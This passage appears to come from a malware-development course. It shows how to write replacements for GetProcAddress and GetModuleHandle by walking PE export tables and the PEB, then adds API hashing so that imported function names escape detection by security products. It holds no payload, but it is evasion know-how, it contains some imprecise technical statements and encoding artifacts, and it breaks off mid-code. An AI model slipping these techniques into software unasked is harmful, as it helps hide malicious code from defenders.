Let's recall how to retrieve the export directory,??`IMAGE_EXPORT_DIRECTORY`. The code snippet below should be familiar since it was explained in the??_Parsing PE Headers_??module.

The??`pBase`??variable at the beginning of the function is the only new addition in the code snippet. This variable is created to avoid type-casting later on when converting relative virtual addresses (RVAs) to virtual addresses (VAs). The Visual Studio compiler will throw an error when adding a??`PVOID`??data type to a value, and therefore??`hModule`??was casted to??`PBYTE`??instead.

```c
FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {

	// We do this to avoid casting each time we use 'hModule'
	PBYTE pBase = (PBYTE) hModule;
	
	// Getting the DOS header and performing a signature check
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) 
		return NULL;
	
	// Getting the NT headers and performing a signature check
	PIMAGE_NT_HEADERS	pImgNtHdrs	= (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) 
		return NULL;

	// Getting the optional header
	IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;

	// Getting the image export table
	// This is the export directory
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  
    // ...
}
```

### Accessing Exported Functions

After obtaining a pointer to the??`IMAGE_EXPORT_DIRECTORY`??structure, it's possible to loop through the exported functions. The??`NumberOfFunctions`??member specifies the number of functions exported by??`hModule`. As a result, the maximum iterations of the loop should be equivalent to??`NumberOfFunctions`.

```c
for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
  // Searching for the target exported function 
}
```

### Building The Search Logic

The next step is to build the search logic for the functions. The building of the search logic requires the use of??`AddressOfFunctions`,??`AddressOfNames`, and??`AddressOfNameOrdinals`, which are all arrays containing RVAs referencing a single unique function in the export table.

```c
typedef struct _IMAGE_EXPORT_DIRECTORY {
    // ...
	// ...
    DWORD   AddressOfFunctions;     // RVA from base of image
    DWORD   AddressOfNames;         // RVA from base of image
    DWORD   AddressOfNameOrdinals;  // RVA from base of image
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

Since these elements are RVAs, the base address of the module,??`pBase`, must be added to get the VA. The first two code snippets should be straightforward. They retrieve the function's name and the function's address, respectively. The third snippet retrieves the function's??_ordinal_, which is explained in detail in the next section.

```c
// Getting the function's names array pointer
PDWORD FunctionNameArray 	= (PDWORD)(pBase + pImgExportDir->AddressOfNames);

// Getting the function's addresses array pointer
PDWORD FunctionAddressArray 	= (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);

// Getting the function's ordinal array pointer
PWORD  FunctionOrdinalArray 	= (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
```

### Understanding Ordinals

An ordinal of a function is an integer value that represents the position of the function within an exported function table in the DLL. The export table is organized as a list (array) of function pointers, with each function being assigned an ordinal value based on its position in the table.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/ordinals-getproc.png)

It's important to note that the ordinal value is used to identify a function's??**address**??rather than its name. The export table operates this way to handle cases where the function name is not available or is not unique. In addition to that, fetching a function's address using its ordinal is faster than using its name. For this reason, the operating system uses the ordinal to retrieve a function's address.

For example,??`VirtualAlloc`'s address is equal to??`FunctionAddressArray[ordinal of VirtualAlloc]`, where??`FunctionAddressArray`??is the function's addresses array pointer fetched from the export table.

With this in mind, the following code snippet will print the ordinal value of each function in the function array of a specified module.

```c
// Getting the function's names array pointer
PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	
// Getting the function's addresses array pointer
PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	
// Getting the function's ordinal array pointer
PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

// Looping through all the exported functions
for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){

	// Getting the name of the function
	CHAR* pFunctionName		= (CHAR*)(pBase + FunctionNameArray[i]);
	
	// Getting the ordinal of the function
	WORD wFunctionOrdinal = FunctionOrdinalArray[i];
	
	// Printing
	printf("[ %0.4d ] NAME: %s -\t ORDINAL: %d\n", i, pFunctionName, wFunctionOrdinal);
}
```

### GetProcAddressReplacement Partial Demo

Although??`GetProcAddressReplacement`??is not complete yet, it should now output the function names and their associated ordinal numbers. To test out what's been built so far, call the function with the following parameters:

```c
GetProcAddressReplacement(GetModuleHandleA("ntdll.dll"), NULL);
```

As expected, the function name and the function's ordinal are printed to the console.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getproc-109913387-f0fdcc3d-e9aa-48f3-bb97-615758130bad.png)

### Ordinal To Address

With the function's ordinal value, it's possible to get the function's address.

```c
// Getting the function's names array pointer
PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	
// Getting the function's addresses array pointer
PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	
// Getting the function's ordinal array pointer
PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);


// Looping through all the exported functions
for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){

	// Getting the name of the function
	CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
	
	// Getting the ordinal of the function
	WORD wFunctionOrdinal = FunctionOrdinalArray[i];
	
	// Getting the address of the function through it's ordinal
	PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);
	
	printf("[ %0.4d ] NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, wFunctionOrdinal);
}
```

To verify the functionality, open??`notepad.exe`??using xdbg and check the exports of??`ntdll.dll`.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getproc-209914072-4c8104f3-6208-42c4-8822-479c44d291ce.png)

The image above shows the address of??`A_SHAUpdate`??being??`0x00007FFD384D2D10`??in both xdbg and using the??`GetProcAddressReplacement`??function. Although notice that the ordinals are different for the function due to the Windows Loader generating a new array of ordinals for every process.

### GetProcAddressReplacement Code

The last bit of code needed for the function to be complete is a way to compare the exported function names to the target function name,??`lpApiName`. This is easily done using??`strcmp`. Then finally, return the function address when there is a match.

```c
FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {

	// We do this to avoid casting at each time we use 'hModule'
	PBYTE pBase = (PBYTE)hModule;
	
	// Getting the dos header and doing a signature check
	PIMAGE_DOS_HEADER	pImgDosHdr		= (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) 
		return NULL;
	
	// Getting the nt headers and doing a signature check
	PIMAGE_NT_HEADERS	pImgNtHdrs		= (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) 
		return NULL;

	// Getting the optional header
	IMAGE_OPTIONAL_HEADER	ImgOptHdr	= pImgNtHdrs->OptionalHeader;

	// Getting the image export table
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Getting the function's names array pointer
	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	
	// Getting the function's addresses array pointer
	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	
	// Getting the function's ordinal array pointer
	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);


	// Looping through all the exported functions
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
		
		// Getting the name of the function
		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
		
		// Getting the address of the function through its ordinal
		PVOID pFunctionAddress	= (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
		
		// Searching for the function specified
		if (strcmp(lpApiName, pFunctionName) == 0){
			printf("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
			return pFunctionAddress;
		}
	}
	
	return NULL;
}
```

### GetProcAddressReplacement Final Demo

The image below shows the output of both??`GetProcAddress`??and??`GetProcAddressReplacement`??searching for the address of??`NtAllocateVirtualMemory`. As expected, both have resulted in the correct function address and therefore a custom implementation of??`GetProcAddress`??was successfully built.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getproc-309915517-9f411b29-61c3-4104-9d05-7fa8977ddeca.png)
# 6.2 IAT Hiding & Obfuscation - Custom GetModuleHandle

### Introduction

The??`GetModuleHandle`??function retrieves a handle for a specified DLL. The function returns a handle to the DLL or??`NULL`??if the DLL does not exist in the calling process.

In this module, a function that will replace??`GetModuleHandle`??will be implemented. The new function's prototype is shown below.

```c
HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName){}
```

### How GetModuleHandle Works

The??`HMODULE`??data type is the base address of the loaded DLL which is where the DLL is located in the address space of the process. Therefore, the goal of the replacement function is to retrieve the base address of a specified DLL.

The Process Environment Block (PEB) contains information regarding the loaded DLLs, notably the??`PEB_LDR_DATA Ldr`??member of the PEB structure. Thus, the initial step is to access this member through the PEB structure.

### PEB In 64-bit Systems

Recall that a pointer to the PEB structure is found within the Thread Environment Block (TEB) structure.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getmodulehandle-110036660-4488defa-47aa-4993-902d-0c97cb1673c0.png)

In 64-bit systems, an offset to the pointer of the TEB structure is stored in the??_GS_??register. The following image is from x64dbg.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getmodulehandle-210036220-10ef0096-9099-4066-b6a6-5c5f06cbb4df.png)

  

#### Method 1: Retrieving The PEB In 64-Bit Systems

There are two different approaches to retrieving the PEB. The first method involves retrieving the TEB structure and then getting a pointer to the PEB. This approach can be performed using the??[__readgsqword(0x30)](https://learn.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-170)??macro in Visual Studio which reads??`0x30`??bytes from the GS register to reach a pointer to the TEB structure.

```c
// Method 1
PTEB pTeb = (PTEB)__readgsqword(0x30);
PPEB pPeb = (PPEB)pTeb->ProcessEnvironmentBlock;
```

#### Method 2: Retrieving The PEB In 64-Bit Systems

The next method retrieves the PEB structure directly by skipping the TEB structure using??[__readgsqword(0x60)](https://learn.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-170)??macro in Visual Studio which reads??`0x60`??bytes from GS register.

```c
// Method 2
PPEB pPeb2 = (PPEB)(__readgsqword(0x60));
```

This can be done because the??`ProcessEnvironmentBlock`??element is??`0x60`??(hex) or 96 bytes from the start of the TEB structure

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getmodulehandle-021764060-4bc54cbd-29ea-470a-9402-ac2fbd0bb4db.png)

### PEB In 32-bit Systems

In 32-bit systems, an offset to the pointer of the TEB structure is stored in the??`FS`??register. The following image is from x32dbg.

![12312](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getmodulehandle-310037888-cfab12a2-d9ff-4174-9c6e-2cc335d6809e.png)

And recall that a??**pointer**??of the PEB structure is in the TEB.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getmodulehandle-410036660-4488defa-47aa-4993-902d-0c97cb1673c0.png)

#### Method 1: Retrieving The PEB In 32-Bit Systems

Similarly to 64-bit systems, there are two methods to retrieve the PEB.

The first method involves getting the TEB structure and then getting the PEB structure using the??[__readfsdword(0x18)](https://learn.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-170)??macro in Visual Studio which reads??`0x18`??bytes from the FS register.

```c
// Method 1
PTEB pTeb = (PTEB)__readfsdword(0x18);
PPEB pPeb = (PPEB)pTeb->ProcessEnvironmentBlock;
```

#### Method 2: Retrieving The PEB In 32-Bit Systems

The second method gets the PEB directly by skipping the TEB structure using the??[__readfsdword(0x30)](https://learn.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-170)??macro in Visual Studio which reads??`0x30`??bytes from the FS register.

```c
// Method 2
PPEB pPeb2 = (PPEB)(__readfsdword(0x30));
```

`0x30`??(hex) is 48 bytes which is the offset of the??`ProcessEnvironmentBlock`??element from the 32-bit TEB structure. The??`PVOID`??data type is 4 bytes in 32-bit systems.

### Enumerating DLLs

Once the PEB structure has been retrieved, the next step is to access the??`PEB_LDR_DATA Ldr`??member. Recall that this member contains information regarding the loaded DLLs in the process.

#### PEB_LDR_DATA Structure

The??`PEB_LDR_DATA`??structure is shown below. The important member in this structure is??`LIST_ENTRY InMemoryOrderModuleList`.

```c
typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

#### LIST_ENTRY Structure

The??`LIST_ENTRY`??structure shown below is a??[doubly-linked list](https://en.wikipedia.org/wiki/Doubly_linked_list), which is essentially the same as arrays but easier to access adjacent elements.

```c
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;
```

Doubly-linked lists use the??`Flink`??and??`Blink`??elements as the head and tail pointers, respectively. This means??`Flink`??points to the next node in the list whereas the??`Blink`??element points to the previous node in the list. These pointers are used to traverse the linked list in both directions. Knowing this, to start enumerating this list, one should start by accessing its first element,??`InMemoryOrderModuleList.Flink`.

According to Microsoft's definition for the??`InMemoryOrderModuleList`??member, it states that each item in the list is a pointer to an??`LDR_DATA_TABLE_ENTRY`??structure.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/msdn-593029583.png)

#### LDR_DATA_TABLE_ENTRY Structure

The??`LDR_DATA_TABLE_ENTRY`??structure represents a DLL inside the linked list of loaded DLLs for the process. Every??`LDR_DATA_TABLE_ENTRY`??represents a unique DLL.

```c
typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];					
    LIST_ENTRY InMemoryOrderLinks;	// doubly-linked list that contains the in-memory order of loaded modules
    PVOID Reserved2[2];			
    PVOID DllBase;
    PVOID EntryPoint;
    PVOID Reserved3;
    UNICODE_STRING FullDllName;		// 'UNICODE_STRING' structure that contains the filename of the loaded module
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

#### Implementation Logic

Based on everything mentioned so far, the required actions are:

1. Retrieve the PEB
    
2. Retrieve the Ldr member from the PEB
    
3. Retrieve the first element in the linked list
    

```c
HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName) {

// Getting peb
#ifdef _WIN64 // if compiling as x64
	PPEB			pPeb	= (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
	PPEB			pPeb	= (PEB*)(__readfsdword(0x30));
#endif

	// Getting the Ldr
	PPEB_LDR_DATA		    pLdr	= (PPEB_LDR_DATA)(pPeb->Ldr);
  
	// Getting the first element in the linked list which contains information about the first module
	PLDR_DATA_TABLE_ENTRY	pDte	= (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
  
}  
```

Since every??`pDte`??represents a unique DLL inside of the linked list, it's possible to get to the next element using the following line of code:

```c
pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
```

The above line of code may look complex but all it is doing is dereferencing the value stored at the address pointed to by??`pDte`??and then casting the result to a pointer to the??`PLDR_DATA_TABLE_ENTRY`??structure. This is simply how linked lists work, which is something like the following image

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getmodule-new-221769848-48118974-d4b7-4a63-b2ce-8802bdec4573.png)

### Enumerate DLLs - Code

The code snippet below will retrieve the name of the DLLs already loaded inside the calling process. The function searches for the target module,??`szModuleName`. If there is a match, the function returns a handle to the DLL (`HMODULE`), otherwise, it returns??`NULL`.

```c
HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName) {

// Getting PEB
#ifdef _WIN64 // if compiling as x64
	PPEB			pPeb	= (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
	PPEB			pPeb	= (PEB*)(__readfsdword(0x30));
#endif

	// Getting Ldr
	PPEB_LDR_DATA		    pLdr	= (PPEB_LDR_DATA)(pPeb->Ldr);
  
	// Getting the first element in the linked list which contains information about the first module
	PLDR_DATA_TABLE_ENTRY	pDte	= (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
	
	while (pDte) {
		
		// If not null
		if (pDte->FullDllName.Length != NULL) {
           	// Print the DLL name
			wprintf(L"[i] \"%s\" \n", pDte->FullDllName.Buffer);
		}
		else {
			break;
		}
		
		// Next element in the linked list
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

	}

	return NULL;
}
```

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getmodulehandle-510041809-92e59481-49dc-4f6c-bc6d-74133ba5fa3b.png)

  

### Case Sensitive DLL Names

By examining the output in the previous image, one can easily observe that some DLL names are capitalized and others are not, which affects the ability to obtain the DLL base address (`HMODULE`). For example, if one is searching for the??`KERNEL32.DLL`??DLL and passes??`Kernel32.DLL`??instead, the??[wcscmp](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp?view=msvc-170)??function will treat both as different strings.

To address this, the helper function??`IsStringEqual`??was created to take two strings and convert them into a lower-case representation, then compare them in this state. It returns true if both strings are equal and false otherwise.

```c

BOOL IsStringEqual (IN LPCWSTR Str1, IN LPCWSTR Str2) {

	WCHAR   lStr1	[MAX_PATH],
			lStr2	[MAX_PATH];

	int		len1	= lstrlenW(Str1),
			len2	= lstrlenW(Str2);

	int		i		= 0,
			j		= 0;

	// Checking length. We dont want to overflow the buffers
	if (len1 >= MAX_PATH || len2 >= MAX_PATH)
		return FALSE;

    // Converting Str1 to lower case string (lStr1)
	for (i = 0; i < len1; i++){
		lStr1[i] = (WCHAR)tolower(Str1[i]);
	}
	lStr1[i++] = L'\0'; // null terminating

    // Converting Str2 to lower case string (lStr2)
	for (j = 0; j < len2; j++) {
		lStr2[j] = (WCHAR)tolower(Str2[j]);
	}
	lStr2[j++] = L'\0'; // null terminating

	// Comparing the lower-case strings
	if (lstrcmpiW(lStr1, lStr2) == 0)
		return TRUE;

	return FALSE;
}

```

### DLL Base Address

Obtaining the DLL base address requires referencing the??`LDR_DATA_TABLE_ENTRY`??structure. Unfortunately, large chunks of the structure are missing in Microsoft's official documentation. Therefore, to gain a better understanding of the structure, a search was conducted on??[Windows Vista Kernel Structures](https://www.nirsoft.net/kernel_struct/vista/index.html). The results for the structure can be found??[here](https://www.nirsoft.net/kernel_struct/vista/LDR_DATA_TABLE_ENTRY.html).

```c
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PACTIVATION_CONTEXT EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
```

The DLL base address is??`InInitializationOrderLinks.Flink`, although the name does not suggest that, but unfortunately Microsoft likes to confuse people. By comparing this member to Microsoft's official documentation of??`LDR_DATA_TABLE_ENTRY`, it can be seen that the base address of the DLL is a reserved element (`Reserved2[0]`).

With this in mind, the??`GetModuleHandle`??replacement function can be completed.

### GetModuleHandle Replacement Function

`GetModuleHandleReplacement`??is the function that replaces??`GetModuleHandle`. It will search for the given DLL name and if it's loaded by the process it returns a handle to the DLL.

```c
HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName) {

// Getting PEB
#ifdef _WIN64 // if compiling as x64
	PPEB					pPeb		= (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
	PPEB					pPeb		= (PEB*)(__readfsdword(0x30));
#endif

	// Getting Ldr
	PPEB_LDR_DATA			pLdr		= (PPEB_LDR_DATA)(pPeb->Ldr);
	// Getting the first element in the linked list (contains information about the first module)
	PLDR_DATA_TABLE_ENTRY	pDte		= (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
	
	while (pDte) {
		
		// If not null
		if (pDte->FullDllName.Length != NULL) {

			// Check if both equal
			if (IsStringEqual(pDte->FullDllName.Buffer, szModuleName)) {
				wprintf(L"[+] Found Dll \"%s\" \n", pDte->FullDllName.Buffer);
#ifdef STRUCTS
				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
#else
				return (HMODULE)pDte->Reserved2[0];
#endif // STRUCTS

			}

			// wprintf(L"[i] \"%s\" \n", pDte->FullDllName.Buffer);
		}
		else {
			break;
		}
		
		// Next element in the linked list
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

	}

	return NULL;
}
```

One part of the code which was not explained is shown below. This part of the code determines whether Microsoft's version of the??`LDR_DATA_TABLE_ENTRY`??structure is being used or the one from Windows Vista Kernel Structures. Depending on which one was used, the name of the member changes.

```c
#ifdef STRUCTS
				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
#else
				return (HMODULE)pDte->Reserved2[0];
#endif // STRUCTS
```

### GetModuleHandleReplacement2

Another implementation of the??`GetModuleHandleReplacement`??function can be found in this module's code.??`GetModuleHandleReplacement2`??performs DLL enumeration using the head and the linked list's elements which utilize the doubly linked list concept. This function was created for users that are familiar with linked lists.

### Demo

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-getmodulehandle-610043506-5d864abe-3528-4e13-bf28-faeba07c12e2.png)
# 6.3 IAT Hiding & Obfuscation - API Hashing

### Introduction

In the previous two modules, two custom functions were created??`GetProcAddressReplacement`??and??`GetModuleHandleReplacement`??which replaced??`GetProcAddress`??and??`GetModuleHandle`. This was sufficient for performing??_Run-Time Dynamic Linking_??which hides the imported functions from the IAT. However, the strings used within the code reveal which functions are being used. For example, the line below uses the functions to retrieve??`VirtualAllocEx`.

```c
GetProcAddressReplacement(GetModuleHandleReplacement("ntdll.dll"),"VirtualAllocEx")
```

Security solutions can easily retrieve the strings within the compiled binary and recognize that??`VirtualAllocEx`??is being used. To solve this problem, a string hashing algorithm will be applied to both??`GetProcAddressReplacement`??and??`GetModuleHandleReplacement`. Instead of performing string comparisons to acquire the specified module base address or function address, the functions will work with hash values instead.

### Implementing JenkinsOneAtATime32Bit

The??`GetProcAddressReplacement`??and??`GetModuleHandleReplacement`??functions are renamed in this module to??`GetProcAddressH`??and??`GetModuleHandleH`, respectively. These updated functions utilize the??_Jenkins One At A Time_??string hashing algorithm to replace the function and module name with a hash value that represents them. Recall that this algorithm was utilized through the??`JenkinsOneAtATime32Bit`??function that was introduced in the??_String Hashing_??module.

#### Hashing Strings

In order to use the functions shown in this module, it is necessary to obtain the hash value of a module name (e.g.??`User32.dll`) and the hash value of the function name (e.g.??`MessageBoxA`). This can be done by first printing the hashed values to the console. Ensure that the hashing algorithm uses the same seed.

```c
// ...

int main(){
	printf("[i] Hash Of \"%s\" Is : 0x%0.8X \n", "USER32.DLL", HASHA("USER32.DLL")); // Capitalized module name
	printf("[i] Hash Of \"%s\" Is : 0x%0.8X \n", "MessageBoxA", HASHA("MessageBoxA"));
	
  	return 0;
}
```

The above main function will output the following:

```c
[i] Hash Of "USER32.DLL" Is : 0x81E3778E
[i] Hash Of "MessageBoxA" Is : 0xF10E27CA
```

These hash values can now be used with the functions below.

#### Usage

The functions would be used the same way except now the hash value is passed rather than the string value.

```c
// 0x81E3778E is the hash of USER32.DLL
// 0xF10E27CA is the hash of MessageBoxA
fnMessageBoxA pMessageBoxA = GetProcAddressH(GetModuleHandleH(0x81E3778E),0xF10E27CA); 
```

### GetProcAddressH Function

`GetProcAddressH`??is a function that is equivalent to??`GetProcAddressReplacement`??with the main difference being that the hash values of the??`JenkinsOneAtATime32Bit`??string hashing algorithm are employed to compare the exported function names to the input hash.

It's also worth noting that the code uses two macros to make the code cleaner and easier to update in the future.

- `HASHA`??- Calling HashStringJenkinsOneAtATime32BitA (ASCII)
    
- `HASHW`??- Calling HashStringJenkinsOneAtATime32BitW (UNICODE)
    

```c
#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))
```

With that in mind, the??`GetProcAddressH`??is shown below. The function takes two parameters:

- `hModule`??- A handle to the DLL module that contains the function.
    
- `dwApiNameHash`??- The hash value of the function name to get the address of.
    

```c
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

	if (hModule == NULL || dwApiNameHash == NULL)
		return NULL;

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER         pImgDosHdr			  = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS         pImgNtHdrs			  = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	IMAGE_OPTIONAL_HEADER     ImgOptHdr			  = pImgNtHdrs->OptionalHeader;
	
	PIMAGE_EXPORT_DIRECTORY   pImgExportDir		  = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);


	PDWORD  FunctionNameArray	= (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD  FunctionAddressArray	= (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD   FunctionOrdinalArray	= (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		CHAR*	pFunctionName       = (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID	pFunctionAddress    = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		// Hashing every function name pFunctionName
		// If both hashes are equal then we found the function we want 
		if (dwApiNameHash == HASHA(pFunctionName)) {
			return pFunctionAddress;
		}
	}

	return NULL;
}
```

### GetModuleHandleH

The??`GetModuleHandleH`??function is the same as??`GetModuleHandleReplacement`??with the main difference being that the hash values of the??`JenkinsOneAtATime32Bit`??string hashing algorithm will be used to compare the enumerated DLL names to the input hash. Notice how the function capitalizes the string in??`FullDllName.Buffer`, therefore, the??`dwModuleNameHash`??parameter must be the hash value of a??**capitalized**??module name (e.g. USER32.DLL).

```c
HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {

	if (dwModuleNameHash == NULL)
		return NULL;

#ifdef _WIN64
	PPEB      pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB      pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA            pLdr  = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY	pDte  = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {

		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {
			
			// Converting `FullDllName.Buffer` to upper case string 
			CHAR UpperCaseDllName[MAX_PATH];

			DWORD i = 0;
			while (pDte->FullDllName.Buffer[i]) {
				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
				i++;
			}
			UpperCaseDllName[i] = '\0';

			// hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`
			if (HASHA(UpperCaseDllName) == dwModuleNameHash)
				return pDte->Reserved2[0];
			
		}
		else {
			break;
		}

		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}

	return NULL;
}
```

### Demo

This demo uses??`GetModuleHandleH`??and??`GetProcAddressH`??to call??`MessageBoxA`.

```c

#define USER32DLL_HASH      0x81E3778E
#define MessageBoxA_HASH    0xF10E27CA


int main() {
	
	// Load User32.dll to the current process so that GetModuleHandleH will work
	if (LoadLibraryA("USER32.DLL") == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return 0;
	}

	// Getting the handle of user32.dll using GetModuleHandleH 
	HMODULE hUser32Module = GetModuleHandleH(USER32DLL_HASH);
	if (hUser32Module == NULL){
		printf("[!] Cound'nt Get Handle To User32.dll \n");
		return -1;
	}

	// Getting the address of MessageBoxA function using GetProcAddressH
	fnMessageBoxA pMessageBoxA = (fnMessageBoxA)GetProcAddressH(hUser32Module, MessageBoxA_HASH);
